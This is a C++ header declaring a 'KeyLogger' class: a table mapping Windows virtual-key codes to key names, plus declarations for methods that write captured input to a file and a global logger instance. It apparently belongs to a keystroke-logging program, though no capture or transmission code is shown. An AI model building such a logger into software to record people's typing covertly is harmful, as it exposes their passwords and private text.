﻿#pragma once

#include <map>
#include <string_view>


class KeyLogger {
public:
	inline static std::map< int, std::string_view > m_keys {
		{ 0xC1, "Abnt C1" }, { 0xC2, "Abnt C2" },
	{ 0x6B, "Numpad +" }, { 0xF6, "Attn" },
	{ 0x08, "Backspace" }, { 0x03, "Break" },
	{ 0x0C, "Clear" }, { 0xF7, "Cr Sel" },
	{ 0x6E, "Numpad ." }, { 0x6F, "Numpad /" },
	{ 0xF9, "Er Eof" }, { 0x1B, "Esc" },
	{ 0x2B, "Execute" }, { 0xF8, "Ex Sel" },
	{ 0xE6, "IcoClr" }, { 0xE3, "IcoHlp" },
	{ 0x30, "D0" }, { 0x31, "D1" },
	{ 0x32, "D2" }, { 0x33, "D3" },
	{ 0x34, "D4" }, { 0x35, "D5" },
	{ 0x36, "D6" }, { 0x37, "D7" },
	{ 0x38, "D8" }, { 0x39, "D9" },
	{ 0x41, "a" }, { 0x42, "b" },
	{ 0x43, "c" }, { 0x44, "d" },
	{ 0x45, "e" }, { 0x46, "f" },
	{ 0x47, "g" }, { 0x48, "h" },
	{ 0x49, "i" }, { 0x4A, "j" },
	{ 0x4B, "k" }, { 0x4C, "l" },
	{ 0x4D, "m" }, { 0x4E, "n" },
	{ 0x4F, "o" }, { 0x50, "p" },
	{ 0x51, "q" }, { 0x52, "r" },
	{ 0x53, "s" }, { 0x54, "t" },
	{ 0x55, "u" }, { 0x56, "v" },
	{ 0x57, "w" }, { 0x58, "x" },
	{ 0x59, "y" }, { 0x5A, "z" },
	{ 0x6A, "Numpad *" }, { 0xFC, "NoName" },
	{ 0x60, "N0" }, { 0x61, "N1" },
	{ 0x62, "N2" }, { 0x63, "N3" },
	{ 0x64, "N4" }, { 0x65, "N5" },
	{ 0x66, "N6" }, { 0x67, "N7" },
	{ 0x68, "N8" }, { 0x69, "N9" },
	{ 0xBA, "OEM_1 (: ;)" }, { 0xE2, "OEM_102 (> <)" },
	{ 0xBF, "OEM_2 (? /)" }, { 0xC0, "OEM_3 (~ `)" },
	{ 0xDB, "OEM_4 ({ )" }, { 0xDC, "OEM_5 (| \\)" },
	{ 0xDD, "OEM_6 ()" }, { 0xDE, "OEM_7 (\" ')" },
	{ 0xDF, "OEM_8 (� !)" }, { 0xF0, "Oem Attn" },
	{ 0xF3, "Auto" }, { 0xE1, "Ax" },
	{ 0xF5, "Back Tab" }, { 0xFE, "OemClr" },
	{ 0xBC, "OEM_COMMA (< ,)" }, { 0xF2, "Copy" },
	{ 0xEF, "Cu Sel" }, { 0xF4, "Enlw" },
	{ 0xF1, "Finish" }, { 0x95, "Loya" },
	{ 0x93, "Mashu" }, { 0x96, "Roya" },
	{ 0x94, "Touroku" }, { 0xEA, "Jump" },
	{ 0xBD, "OEM_MINUS (_ -)" }, { 0xEB, "OemPa1" },
	{ 0xEC, "OemPa2" }, { 0xED, "OemPa3" },
	{ 0xBE, "OEM_PERIOD (> .)" }, { 0xBB, "OEM_PLUS (+ =)" },
	{ 0xE9, "Reset" }, { 0xEE, "WsCtrl" },
	{ 0xFD, "Pa1" }, { 0xE7, "Packet" },
	{ 0xFA, "Play" }, { 0xE5, "Process" },
	{ 0x0D, "Enter" }, { 0x29, "Select" },
	{ 0x6C, "Separator" }, { 0x20, "Space" },
	{ 0x6D, "Num -" }, { 0x09, "Tab" },
	{ 0xFB, "Zoom" }, { 0x1E, "Accept" },
	{ 0x5D, "Context Menu" }, { 0xA6, "Browser Back" },
	{ 0xAB, "Browser Favorites" }, { 0xA7, "Browser Forward" },
	{ 0xAC, "Browser Home" }, { 0xA8, "Browser Refresh" },
	{ 0xAA, "Browser Search" }, { 0xA9, "Browser Stop" },
	{ 0x14, "Caps Lock" }, { 0x1C, "Convert" },
	{ 0x2E, "Delete" }, { 0x28, "Arrow Down" },
	{ 0x23, "End" }, { 0x70, "F1" },
	{ 0x79, "F10" }, { 0x7A, "F11" },
	{ 0x7B, "F12" }, { 0x7C, "F13" },
	{ 0x7D, "F14" }, { 0x7E, "F15" },
	{ 0x7F, "F16" }, { 0x80, "F17" },
	{ 0x81, "F18" }, { 0x82, "F19" },
	{ 0x71, "F2" }, { 0x83, "F20" },
	{ 0x84, "F21" }, { 0x85, "F22" },
	{ 0x86, "F23" }, { 0x87, "F24" },
	{ 0x72, "F3" }, { 0x73, "F4" },
	{ 0x74, "F5" }, { 0x75, "F6" },
	{ 0x76, "F7" }, { 0x77, "F8" },
	{ 0x78, "F9" }, { 0x18, "Final" },
	{ 0x2F, "Help" }, { 0x24, "Home" },
	{ 0xE4, "Ico00 *" }, { 0x2D, "Insert" },
	{ 0x17, "Junja" }, { 0x15, "Kana" },
	{ 0x19, "Kanji" }, { 0xB6, "App1" },
	{ 0xB7, "App2" }, { 0xB4, "Mail" },
	{ 0xB5, "Media" }, { 0x01, "Left Button **" },
	{ 0xA2, "Left Ctrl" }, { 0x25, "Arrow Left" },
	{ 0xA4, "Left Alt" }, { 0xA0, "Left Shift" },
	{ 0x5B, "Left Win" }, { 0x04, "Middle Button **" },
	{ 0xB0, "Next Track" }, { 0xB3, "Play / Pause" },
	{ 0xB1, "Previous Track" }, { 0xB2, "Stop" },
	{ 0x1F, "Mode Change" }, { 0x22, "Page Down" },
	{ 0x1D, "Non Convert" }, { 0x90, "Num Lock" },
	{ 0x92, "Jisho" }, { 0x13, "Pause" },
	{ 0x2A, "Print" }, { 0x21, "Page Up" },
	{ 0x02, "Right Button **" }, { 0xA3, "Right Ctrl" },
	{ 0x27, "Arrow Right" }, { 0xA5, "Right Alt" },
	{ 0xA1, "Right Shift" }, { 0x5C, "Right Win" },
	{ 0x91, "Scrol Lock" }, { 0x5F, "Sleep" },
	{ 0x2C, "Print Screen" }, { 0x26, "Arrow Up" },
	{ 0xAE, "Volume Down" }, { 0xAD, "Volume Mute" },
	{ 0xAF, "Volume Up" }, { 0x05, "X Button 1 **" },
	{ 0x06, "X Button 2 **" } };

public:
	void WriteToFile( const std::string_view &, bool = false ) const;

private:
	void InputToFile( const std::string_view & ) const;

};

extern KeyLogger g_log;
